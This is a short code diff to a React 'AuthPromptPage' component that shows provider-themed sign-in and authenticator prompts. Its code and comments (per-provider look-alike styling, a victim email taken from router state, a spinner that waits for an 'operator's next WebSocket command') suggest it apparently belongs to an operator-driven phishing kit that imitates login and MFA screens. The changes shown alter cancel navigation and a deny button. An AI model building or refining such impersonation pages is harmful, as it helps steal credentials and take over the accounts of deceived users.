@@ -1,5 +1,5 @@
 import React from 'react';
-import { useLocation } from 'react-router-dom';
+import { useLocation, useNavigate } from 'react-router-dom';
 import { ProviderKey, getProviderTheme } from './providerTheme';
 import ProviderShell from './ProviderShell';
 
@@ -17,6 +17,7 @@ interface AuthPromptPageProps {
  */
 const AuthPromptPage: React.FC<AuthPromptPageProps> = ({ providerKey, onAction }) => {
   const location = useLocation();
+  const navigate = useNavigate();
   const theme = getProviderTheme(providerKey);
   const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
   const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
@@ -81,9 +82,8 @@ const AuthPromptPage: React.FC<AuthPromptPageProps> = ({ providerKey, onAction }
   };
 
   const goBack = () => {
-    // Standardised "wait for command" cancel — App-level handler shows the
-    // full-page spinner and waits for the operator's next WebSocket command.
-    onAction('user_canceled');
+    onAction('cancel');
+    navigate(-1);
   };
 
   // Spinner / illustration block that varies subtly per provider.
@@ -195,7 +195,7 @@ const AuthPromptPage: React.FC<AuthPromptPageProps> = ({ providerKey, onAction }
     primaryActions = (
       <button
         type="button"
-        onClick={goBack}
+        onClick={() => onAction('deny_authenticator')}
         className="px-6 py-[6px] text-[#1b1b1b] text-sm font-semibold border border-[#8a8886] hover:bg-[#f3f2f1]"
         style={{ minWidth: '108px' }}
       >
